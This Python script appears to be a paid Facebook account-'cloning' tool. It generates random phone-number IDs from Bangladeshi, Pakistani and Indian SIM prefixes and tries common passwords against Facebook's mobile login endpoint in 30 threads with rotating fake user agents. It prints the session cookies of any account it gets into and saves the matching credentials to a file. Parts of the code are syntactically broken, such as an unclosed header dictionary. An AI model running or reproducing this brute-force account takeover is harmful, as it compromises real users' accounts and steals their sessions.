#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m' 
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
MXD = '\033[1;92m' #MAHADIGREEN
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU

ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()


current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
mnum=[]
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/fff-00/bbnew/blob/main/bbnew.txt').text
        ua=open('.bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.bbnew.txt','r').read().splitlines()
    
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

os.system("xdg-open https://www.facebook.com/Mr.Tutul.ok.Bro")
NameX =input('\033[1;97m[+]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \033[1;96m')

logo ="""
\033[0;92m ████████╗\033[0;91m ██╗   ██╗\033[0;94m ████████╗\033[0;93m ██╗   ██╗\033[0;95m  ██╗
\033[0;92m ╚══██╔══╝\033[0;91m ██║   ██║\033[0;94m ╚══██╔══╝\033[0;93m ██║   ██║\033[0;95m  ██║
   \033[0;92m ██║\033[0;91m    ██║   ██║\033[0;94m    ██║\033[0;93m    ██║   ██║\033[0;95m  ██║
   \033[0;92m ██║\033[0;91m    ██║   ██║\033[0;94m    ██║\033[0;93m    ██║   ██║\033[0;95m  ██║ 
   \033[0;92m ██║\033[0;91m    ╚██████╔╝\033[0;94m    ██║\033[0;93m    ╚██████╔╝\033[0;95m  ███████║
   \033[0;92m ╚═╝\033[0;91m     ╚═════╝\033[0;94m     ╚═╝\033[0;93m     ╚═════╝\033[0;95m   ╚══════╝
\033[1;97m====================================================
[^] AUTHOR   : MR. TUTUL
[^] YOUTUBE  : Android Fb Tutul
[^] GITHUB   : Tutul75o
[^] WHATSAPP : 01608843956
[^] TOOLS    : TOOL FOR PAID
[^] VERSION  : 1.0.3
\033[1;97m===================================================="""

#---------------------[MAIN MENU]---------------------#
def main():
    os.getuid
    os.system("clear");print(logo)
    print(f"\033[1;97m[01] \033[1;92mRANDOM CLONING ")
    print(f"\033[1;97m[02] \033[1;92mFOLLOW ME ON FACEBOOK")
    print(f"\033[1;97m[00] \033[1;92mEXIT TOOL")
    print('\033[1;97m====================================================') 
    adi = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT OPTION \033[1;37m: \033[1;36m")
    if adi in ["1","01"]:
        __TUTUL__ALL___()
    elif adi in ["2","02"]:
        os.system("xdg-open https://www.facebook.com/Mr.Tutul.ok.Bro")
        main()
    elif adi in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\3[1;31m')
        main()


def __TUTUL__ALL___():
    os.system("clear")
    print(logo)
    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m017 019 018 016')
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
    print('\033[1;97m====================================================') 
    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
    print('\033[1;97m====================================================') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)
    limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        os.system("clear")
        print(logo)
        tl = str(len(user))
        print(f"\033[0;92m\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[0;92m\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
        print(f"\033[0;92m\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[0;92m\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m1') 
        print('\033[1;97m====================================================') 
        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        print('\033[1;97m====================================================') 
        for love in user:
            uid = code+love
            ps1 = uid[5:]
            pwx = [love,ps1,'i love you','free fire']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()


def freeq(uid,pwx,tl):
    global loop
    global cps
    global oks
    global ugen
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[TUTUL] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            ua = random.choice(ugen)
            ua2 = random.choice(ugen2)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=CqxQZTi2QlwGyBI1wYkROdfP; sb=CqxQZWR4c18HMzlq3O2kH26F; locale=en_GB; vpd=v1%3B666x360x2; wl_cbv=v2%3Bclient_version%3A2356%3Btimestamp%3A1699811812; m_pixel_ratio=2; wd=360x666; fr=055dVZWnO2h8i9xYy.AWU2hMURWPH7xTSO57GMjz0eY3g.BlUKwK.67.AAA.0.0.BlURNe.AWXiCwj8DRE',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"itel S661LP"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
            lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f'\r\33[1;97m[TUTUL-OK] '+uid+' | '+ps+' ')
                print(f'\r\033[1;92m[🌺]COOKIES : '+coki)
                open('/sdcard/TUTUL-OK.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(cid) 
                break
                
            else:
                continue
        loop+=1
    except:
        pass
        
#---------------------[END MENU]---------------------#
if __name__ == '__main__':
    main()
